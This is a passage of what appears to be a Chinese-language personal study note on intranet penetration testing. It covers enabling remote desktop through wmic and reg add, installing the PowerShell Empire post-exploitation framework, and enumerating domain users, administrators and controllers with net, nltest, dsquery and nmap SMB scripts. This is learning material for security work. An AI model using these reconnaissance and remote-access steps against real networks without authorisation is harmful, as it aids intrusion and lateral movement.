PrivDiscUiShown REG_DWORD 0x1
EnableHttp1_1 REG_DWORD 0x1
WarnOnIntranet REG_DWORD 0x1
MimeExclusionListForCache REG_SZ multipart&#x2F;mixed multipart&#x2F;x-mixed-replace multipart&#x2F;x-byteranges
AutoConfigProxy REG_SZ wininet.dll
UseSchannelDirectly REG_BINARY 01000000
WarnOnPost REG_BINARY 01000000
UrlEncoding REG_DWORD 0x0
SecureProtocols REG_DWORD 0xa0
PrivacyAdvanced REG_DWORD 0x0
ZonesSecurityUpgrade REG_BINARY E047C9A122D0D901
DisableCachingOfSSLPages REG_DWORD 0x1
WarnonZoneCrossing REG_DWORD 0x1
CertificateRevocation REG_DWORD 0x1
EnableNegotiate REG_DWORD 0x1
MigrateProxy REG_DWORD 0x1
ProxyEnable REG_DWORD 0x0

#参数解释
IE5_UA_Backup_Flag：Internet Explorer 5 用户代理备份标志。值为 5.0。
User Agent：用户代理字符串，标识浏览器和操作系统的版本信息。值为 Mozilla&#x2F;4.0 (compatible; MSIE 8.0; Win32)。
EmailName：与用户关联的电子邮件名称。值为 User@。
PrivDiscUiShown：指示是否显示了特定的隐私提示对话框。值为 0x1。
EnableHttp1_1：指示是否启用了 HTTP 1.1 版本。值为 0x1。
WarnOnIntranet：指示是否在访问内部网站时显示警告。值为 0x1。
MimeExclusionListForCache：用于缓存排除的 MIME 类型列表。值为 multipart&#x2F;mixed multipart&#x2F;x-mixed-replace multipart&#x2F;x-byteranges。
AutoConfigProxy：自动配置脚本的文件名。值为 wininet.dll。
UseSchannelDirectly：指示是否直接使用 Schannel 进行安全通信。值为 01000000。
WarnOnPost：指示是否在提交表单时显示警告。值为 01000000。
UrlEncoding：URL 编码设置。值为 0x0。
SecureProtocols：指定启用的安全协议。值为 0xa0。
PrivacyAdvanced：高级隐私设置。值为 0x0。
ZonesSecurityUpgrade：区域安全升级标志。值为 E047C9A122D0D901。
DisableCachingOfSSLPages：指示是否禁用缓存 SSL 页面。值为 0x1。
WarnonZoneCrossing：指示是否在区域间导航时显示警告。值为 0x1。
CertificateRevocation：指示是否启用证书吊销检查。值为 0x1。
EnableNegotiate：指示是否启用了协商身份验证。值为 0x1。
MigrateProxy：指示是否迁移代理设置。值为 0x1。
ProxyEnable：指示是否启用代理。值为 0x0。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="查询并开启远程连接服务-远程桌面">查询并开启远程连接服务(远程桌面)</h3>
<ul>
<li>查看远程桌面连接端口（0xd3d换成10进制即3389）</li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; &#x2F;V PortNumber<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<ul>
<li>在Windows Server 2003 中开启3389 端口</li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">wmic path win32_terminalservicesetting where (__CLASS !&#x3D;&quot;&quot;) call setallowtsconnections 1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<ul>
<li>在Windows Server 2008 和Windows Server 2012 中开启3389 端口</li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">wmic &#x2F;namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS !&#x3D;&quot;&quot;) call setallowtsconnections 1

wmic &#x2F;namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName&#x3D;&#39;RDP-Tcp&#39;) call setuserauthenticationrequired 1

reg add &quot;HKLM\SYSTEM\CURRENT\CONTROLSET\CONTROL\TERMINAL SERVER&quot; &#x2F;v fSingleSessionPerUser &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="2、自动收集本地工作组信息">2、自动收集本地工作组信息</h2>
<h3 id="wmic-脚本">wmic 脚本</h3>
<p>wmic 脚本下载地址：<a target="_blank" rel="noopener" href="https://www.fuzzysecurity.com/scripts/files/wmic_info.rar">https://www.fuzzysecurity.com/scripts/files/wmic_info.rar</a></p>
<p>直接将脚本在目标主机上运行，运行结束后会生成一个 output.html 文件</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/640-1698743846259-3.png" alt="图片"></p>
<h3 id="PowerShsell-Empire">PowerShsell Empire</h3>
<p>说明：PowerShsell Empire中文简称 “帝国” ，是一款针对 Windows 系统平台而打造的渗透工具，以下是 Empire 和万能的 MSF 的一些区别。</p>
<ul>
<li>MSF 是全平台的，无论是win，linux，mac都可以打，但 Empire 是只针对 Windows 的</li>
<li>MSF 集信息收集，渗透，后渗透，木马，社工的功能为一体，全面多能；而 Empire 专注于内网渗透，它是针对 PowerShell 的</li>
</ul>
<p>当使用 Empire 使主机上线后，可调用<code>powershell/situational_awareness/host/winenum</code>模块查看本机用户信息、系统基本信息、剪贴板等等信息</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/640-1698745747238-6.png" alt="图片"></p>
<p>调用<code>powershell/situational_awareness/host/computerdetails</code>模块可查看更丰富的信息，比如RDP登录信息、主机时间日志等等，在运行这个模块时需要管理员权限</p>
<p>PowerShsell Empire安装：</p>
<pre class="line-numbers language-none"><code class="language-none">sudo docker pull empireproject&#x2F;empire
sudo docker run -it -p 7000:7000 --name empire empireproject&#x2F;empire &#x2F;bin&#x2F;bash
sudo .&#x2F;setup&#x2F;reset.sh	【会报Enter server negotiation password,enter for random generation，直接回车即可】
#需要先升级pip
wget https:&#x2F;&#x2F;bootstrap.pypa.io&#x2F;pip&#x2F;2.7&#x2F;get-pip.py
python get-pip.py	【可能网络问题会失败，多试几次】
ln -s &#x2F;usr&#x2F;local&#x2F;bin&#x2F;pip2.7 &#x2F;usr&#x2F;bin&#x2F;pip
pip install pefile	【直接运行会报缺少这个包】
#启动运行empire
sudo .&#x2F;empire

#退出直接ctrl+d
sudo docker ps -a	【记下容器ID，方便下次启动】
sudo docker start f9f75cc514c8	【启动容器】
sudo docker exec -it f9f75cc514c8 &#x2F;bin&#x2F;bash	 【进入容器】
sudo .&#x2F;empire

#启动并进入容器
sudo docker start -a -i f9f75cc514c8
sudo .&#x2F;empire<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>相关文章：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/236174">https://www.anquanke.com/post/id/236174</a></li>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/yokan/p/13179730.html">https://www.cnblogs.com/yokan/p/13179730.html</a></li>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/u013930899/article/details/124871901">https://blog.csdn.net/u013930899/article/details/124871901</a></li>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/summer14/p/17267303.html">https://www.cnblogs.com/summer14/p/17267303.html</a></li>
<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzIwOTMzMzY0Ng==&amp;mid=2247484949&amp;idx=1&amp;sn=2ac6d8a4bd2b76772315b8b6373835d7">https://mp.weixin.qq.com/s?__biz=MzIwOTMzMzY0Ng==&amp;mid=2247484949&amp;idx=1&amp;sn=2ac6d8a4bd2b76772315b8b6373835d7</a></li>
</ul>
<h1>域内信息收集</h1>
<h2 id="1、判断是否存在域">1、判断是否存在域</h2>
<h3 id="ipconfig">ipconfig</h3>
<p>方法1：</p>
<p>判断依据：查看网关 IP 地址、DNS 的 IP 地址、域名、本机是否和 DNS 服务器处于同一网段</p>
<pre class="line-numbers language-none"><code class="language-none">ipconfig &#x2F;all<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231031220704493.png" alt="image-20231031220704493"></p>
<p>接着使用 nslookup 解析域名的 IP 地址，查看是否与 DNS 服务器为同一 IP</p>
<pre class="line-numbers language-none"><code class="language-none">nslookup teamssix.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231031220745292.png" alt="image-20231031220745292"></p>
<p>方法2：</p>
<p>判断依据：当前主机如果处于工作组但未加入域中，则主DNS后缀为空。如果加入了域则主DNS为域名</p>
<ol>
<li>工作组中</li>
</ol>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231101104717430.png" alt="image-20231101104717430"></p>
<p><mark>只要没有加入域，主机的网卡不管有没有自定义dns服务器ip。 执行 ipconfg /all 后主DNS后缀都为空</mark></p>
<ol start="2">
<li>域环境</li>
</ol>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231101104820520.png" alt="image-20231101104820520"></p>
<p><mark>只要加入域，不管当前用户为域用户本还是本地用户，主DNS后缀，都为域名</mark></p>
<h3 id="系统详细信息">系统详细信息</h3>
<pre class="line-numbers language-none"><code class="language-none">systeminfo
或
systeminfo | findstr 域:
#显示项中的“域”即域名，“登录服务器”即域控制器
#显示项中的“登录服务器”即域控制器<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231031221314111.png" alt="image-20231031221314111"></p>
<p><mark>工作组环境systeminfo查询的显示为WORKGROU</mark></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231101105208638.png" alt="image-20231101105208638"></p>
<p><mark>域环境查询的域是域名</mark>【域中，不管此时是什么用户登录。查询的域是域名】</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231101105324363.png" alt="image-20231101105324363"></p>
<h3 id="当前登录域与域用户">当前登录域与域用户</h3>
<pre class="line-numbers language-none"><code class="language-none">net config workstation
或
net config workstation | findstr 域
#显示项的“工作站域 DNS 名称”即域名（若为“WORKGROUP”则表示不在域中）
#显示项的“登录域”用于表示当前登录的用户是域用户还是本地用户
#登录域和工作站域相同就说明当前登录的用户是域用户(待考证)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231031221502285.png" alt="image-20231031221502285"></p>
<h3 id="判断主域控制器">判断主域控制器</h3>
<pre class="line-numbers language-none"><code class="language-none">#原理：通常来说主域服务器也会作为时间服务器
#该命令显示主域控制器的时间信息，包括主域控制器名称、当前日期和时间
net time &#x2F;domain<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<ul>
<li>如果当前主机处于工作组中但未加入域，则显示找不到域控制器</li>
</ul>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231101103350230.png" alt="image-20231101103350230"></p>
<ul>
<li>加入了域，且当前用户仅为本地用户包括本地管理员，则显示拒绝访问</li>
</ul>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231101103457211.png" alt="image-20231101103457211"></p>
<ul>
<li>加入了域，且当前用户为域用户，则显示域控的时间</li>
</ul>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231031221623885.png" alt="image-20231031221623885"></p>
<h2 id="2、收集域内基础信息">2、收集域内基础信息</h2>
<p>说明：以下查询命令在本质上都是通过LDAP协议到域控制器上进行查询的，所以在查询时需要进行权限认证。只有域用户才拥有此权限，本地用户无法运行介绍的查询命令(System权限用户除外)。<mark>在域中，除普通用户外，所有的机器都有一个机器用户，其用户名为机器名加上“$”。System权限用户对应的就是域里面的机器用户，所以System权限用户也可以运行以下查询命令</mark></p>
<h3 id="查看域">查看域</h3>
<pre class="line-numbers language-none"><code class="language-none">net view &#x2F;domain<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231031221911321.png" alt="image-20231031221911321"></p>
<h3 id="查看域内所有计算机">查看域内所有计算机</h3>
<pre class="line-numbers language-none"><code class="language-none">#回显域内所有计算机的计算机名
net view &#x2F;domain:domain_name<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231031221928728.png" alt="image-20231031221928728"></p>
<p>说明：<mark>通过查询得到的计算机名，可以对计算机角色进行初步判断</mark></p>
<ul>
<li>dev：可能是开发服务器</li>
<li>web、app：可能是Web服务器</li>
<li>NAS：可能是存储服务器</li>
<li>fileserver：可能是文件服务器</li>
</ul>
<p>计算机名和主机名：</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231101134907186.png" alt="image-20231101134907186"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231101135438378.png" alt="image-20231101135438378"></p>
<h3 id="查看域内所有用户组列表">查看域内所有用户组列表</h3>
<pre class="line-numbers language-none"><code class="language-none">net group &#x2F;domain<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231031222605367.png" alt="image-20231031222605367"></p>
<p>系统自带的常见用户组：</p>
<ul>
<li>Domain Admins：域管理员组</li>
<li>Domain Computers：域内机器组</li>
<li>Domain Controllers：域控制器组</li>
<li>Domain Guests：域访客组，权限较低</li>
<li>Domain Users：域用户组</li>
<li>Enterprise Admins：企业系统管理员用户组</li>
</ul>
<p>说明：在默认情况下，Domain Admins和Enterprise Admins对域内所有域控制器有完全控制权限</p>
<h3 id="查看域用户组信息">查看域用户组信息</h3>
<pre class="line-numbers language-none"><code class="language-none">#net group &quot;用户组名&quot; &#x2F;domain
net group &quot;Enterprise Admins&quot; &#x2F;domain<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231031222635736.png" alt="image-20231031222635736"></p>
<h3 id="查看域密码策略信息">查看域密码策略信息</h3>
<pre class="line-numbers language-none"><code class="language-none">net accounts &#x2F;domain<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231031222814694.png" alt="image-20231031222814694"></p>
<h3 id="查看域信任信息">查看域信任信息</h3>
<pre class="line-numbers language-none"><code class="language-none">nltest &#x2F;domain_trusts<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231031222919640.png" alt="image-20231031222919640"></p>
<h2 id="3、收集域用户和管理员信息">3、收集域用户和管理员信息</h2>
<h3 id="查询域用户列表">查询域用户列表</h3>
<pre class="line-numbers language-none"><code class="language-none">#该命令用于检索当前所在域中的用户账户信息，并不包括本地计算机上的用户账户
net user &#x2F;domain<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231031223204885.png" alt="image-20231031223204885"></p>
<p>说明：这里提一个很经典的域用户，即krbtgt用户，这个用户不仅可以创建票据授权服务（TGS）的加密密钥，还可以实现多种域内权限持久化方法</p>
<h3 id="查询域用户详细信息">查询域用户详细信息</h3>
<pre class="line-numbers language-none"><code class="language-none">wmic useraccount get &#x2F;all<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231031223221778.png" alt="image-20231031223221778"></p>
<h3 id="查询存在的域用户">查询存在的域用户</h3>
<pre class="line-numbers language-none"><code class="language-none">dsquery user<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231031223252301.png" alt="image-20231031223252301"></p>
<p>常用的 dsquery 命令</p>
<pre class="line-numbers language-none"><code class="language-none">dsquery computer - 查找目录中的计算机
dsquery contact - 查找目录中的联系人
dsquery subnet - 查找目录中的子网
dsquery group - 查找目录中的组
dsquery ou - 查找目录中的组织单位
dsquery site - 查找目录中的站点
dsquery server - 查找目录中的域控制器
dsquery user - 查找目录中的用户
dsquery quota - 查找目录中的配额
dsquery partition - 查找目录中的分区
dsquery * - 用通用的 LDAP 查询查找目录中的任何对象<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="查询本地管理员组用户">查询本地管理员组用户</h3>
<p>说明：<mark>Domain Admins组中的用户默认为域内机器的本地管理员用户(即Domain Admins组会默认被添加到每台域成员计算机的本地Administrators组中)，在实际应用中，为了方便管理，会有域用户被设置为域机器的本地管理员用户</mark>。注意，可以把成员/组加到另一个组中，套娃的玩法</p>
<pre class="line-numbers language-none"><code class="language-none">net localgroup administrators<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="查询域管理员组用户">查询域管理员组用户</h3>
<pre class="line-numbers language-none"><code class="language-none">net group &quot;Domain Controllers&quot; &#x2F;domain<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="查询企业系统管理员用户组用户">查询企业系统管理员用户组用户</h3>
<pre class="line-numbers language-none"><code class="language-none">net group &quot;Enterprise Admins&quot; &#x2F;domain<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="4、查找域控制器">4、查找域控制器</h2>
<h3 id="机器名和主机名的区别">机器名和主机名的区别</h3>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231101114841542.png" alt="image-20231101114841542"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231101114856775.png" alt="image-20231101114856775"></p>
<h3 id="查看域控制器机器名">查看域控制器机器名</h3>
<p>方法1：</p>
<pre class="line-numbers language-none"><code class="language-none">#nltest &#x2F;DCLIST:域名
nltest &#x2F;DCLIST:teamssix
#回显的形如dc.teamssix.com，格式：机器名.域名，所以下面这个案例中的机器名是“dc”<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231031231622198.png" alt="image-20231031231622198"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231101153030137.png" alt="image-20231101153030137"></p>
<p>net time /domain和nltest /DCLIST:teamssix的区别：</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231031232101155.png" alt="image-20231031232101155"></p>
<p>方法2：</p>
<pre class="line-numbers language-none"><code class="language-none">netdom query pdc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231031232838552.png" alt="image-20231031232838552"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231031232818513.png" alt="image-20231031232818513"></p>
<p>方法3：</p>
<pre class="line-numbers language-none"><code class="language-none">#原理：查看域控制器组的成员信息，并且所有的机器都有一个机器用户，其用户名为机器名加上“$”
net group &quot;Domain Controllers&quot; &#x2F;domain
#比如下面的例子，根据用户名为WIN-SERVER-DC$，就可以知道该域控制器的机器名为WIN-SERVER-DC<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231101154755798.png" alt="image-20231101154755798"></p>
<h3 id="查看域控器主机名">查看域控器主机名</h3>
<pre class="line-numbers language-none"><code class="language-none">nslookup -type&#x3D;SRV _ldap._tcp
#回显如dc.teamssix.com，格式：主机名.域名，所以下面这个案例中的主机名恰好也是“dc”<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231031232151999.png" alt="image-20231031232151999"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231031233922264.png" alt="image-20231031233922264"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231031234155838.png" alt="image-20231031234155838"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231031234206481.png" alt="image-20231031234206481"></p>
<p>域控制器(DC)与主域控制器(PDC)：</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231031233102624.png" alt="image-20231031233102624"></p>
<h2 id="5、定位域管理员">5、定位域管理员</h2>
<p>说明：定位域管理员的常规渠道，一是日志，二是会话</p>
<ul>
<li>
<p>日志：指本地机器的管理员日志，可以使用脚本或Wevtutil工具导出并查看</p>
</li>
<li>
<p>会话：指域内每台机器的登录会话，可以使用netsess.exe或PowerView等工具查询(可以匿名查询，不需要权限)</p>
</li>
</ul>
<h3 id="psloggedon">psloggedon</h3>
<p>说明：使用 psloggedon 可以查看本地登录的用户和通过本地计算机或远程计算机进行资源登录的用户</p>
<p>psloggedon 下载地址：<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sysinternals/downloads/psloggedon">https://docs.microsoft.com/en-us/sysinternals/downloads/psloggedon</a></p>
<pre class="line-numbers language-none"><code class="language-none">psloggedon.exe [-] [-l] [-x] [\\computername|username]

-							显示支持的选项和用于输出值的单位。
-l							仅显示本地登录，不显示本地和网络资源登录。
-x							不显示登录时间。
\\computername				指定要列出登录信息的计算机的名称。
Username					指定用户名，在网络中搜索该用户登录的计算机。

#案例演示
psloggedon.exe \\DC
psloggedon.exe -l \\192.168.7.7<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231101174547730.png" alt="image-20231101174547730"></p>
<h3 id="PVEFindADUser">PVEFindADUser</h3>
<p>说明：PVEFindADUser 用于查找活动目录用户登录的位置、枚举域用户，以及查找在特定计算机上登录的用户，包括本地用户、通过 RDP 登录的用户、用于运行服务器和计划任务的用户，<mark>该工具需要管理员权限</mark>。</p>
<p>PVEFindADUser 下载地址：<a target="_blank" rel="noopener" href="https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn">https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn</a></p>
<pre class="line-numbers language-none"><code class="language-none">-h							显示帮助信息
-u							检测程序是否有新版本
-current [&quot;username&quot;]		获取目标计算机上当前登录的所有用户。如果指定用户名（在引号之间），则仅将显示该用户登录的计算机
-noping						阻止尝试枚举用户登录名之前对目标计算机执行ping命令
-target						此可选参数允许您指定要查询的主机。如果未指定此-target参数，则将查询当前域中的所有主机。如果决定指定-target，然后指定以逗号分隔的主机名。查询结果将被输出到report.csv文件中<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-none"><code class="language-none">PVEFindADUser.exe -current
#显示域中所有计算机(计算机、服务器、域控制器等)上当前登录的所有用户<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231101175457522.png" alt="image-20231101175457522"></p>
<h3 id="netview">netview</h3>
<p>说明：netview 是一个枚举工具，使用 WinAPI 枚举系统，利用 NetSessionEnum 寻找登录会话，利用 NetShareEnum 寻找共享，利用 NetWkstaUserEnum 枚举登录的用户，netview 可以查询共享入口和有价值的用户，其<mark>绝大部分功能无需管理员权限就可使用</mark>。</p>
<p>Netview 下载地址：<a target="_blank" rel="noopener" href="https://github.com/mubix/netview">https://github.com/mubix/netview</a></p>
<pre class="line-numbers language-none"><code class="language-none">-h               显示帮助信息
-f filename.txt  指定要提取主机列表的文件
-e filename.txt  指定要排除的主机名的文件
-o filename.txt  将所有输出重定向到指定的文件
-d domain        指定要提取主机列表的域。如果没有指定，则从当前域中提取主机列表
-g group         指定搜索的组名。如果没有指定，则在Domain Admins组中搜索
-c               对已找到的共享目录&#x2F;文件的访问权限进行检查
-i interval      枚举主机之间等待的秒数
-j jitter        应用于间隔的抖动百分比（0.0-1.0）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-none"><code class="language-none">netview.exe -d
#从当前域中提取主机列表<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231102104033134.png" alt="image-20231102104033134"></p>
<h3 id="nmap的NSE-脚本">nmap的NSE 脚本</h3>
<p>常用的 NSE 脚本如下：</p>
<ul>
<li><code>smb-enum-domains.nse</code>:对域控制器进行信息收集，可以获取主机信息、用户、可使用密码策略的用户等</li>
<li><code>smb-enum-users.nse</code>:在进行域渗透时，如获取了域内某台主机权限，但权限有限，无法获取更多的域用户信息，可借助此脚本对域控制器进行扫描</li>
<li><code>smb-enum-shares.nse</code>:遍历远程主机的共享目录</li>
<li><code>smb-enum-processes.nse</code>:对主机的系统进程进行遍历，通过此信息，可知道目标主机运行着哪些软件</li>
<li><code>smb-enum-sessions.nse</code>:获取域内主机的用户登录会话，查看当前是否有用户登录，且不需要管理员权限</li>
<li><code>smb-os-discovery.nse</code>:收集目标主机的操作系统、计算机名、域名、域林名称、NetBIOS机器名、NetBIOS域名、工作组、系统时间等信息</li>
</ul>
